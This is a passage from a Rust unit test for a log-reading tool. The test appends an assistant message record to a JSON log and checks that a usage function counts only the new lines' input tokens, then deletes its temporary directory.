        // Read again after it grows: only the new lines count.
        let more = json!({"ts":"20261008T150300Z","direction":"recv","claude":{"type":"assistant","message":{"id":"m2","usage":usage,"content":[]}}});
        std::fs::write(
            &log,
            format!("{}{more}\n", std::fs::read_to_string(&log).unwrap()),
        )
        .unwrap();
        assert_eq!(stage_usage(&[log]).unwrap()["tokens_in"], 1200);
        let _ = std::fs::remove_dir_all(dir);
    }
}
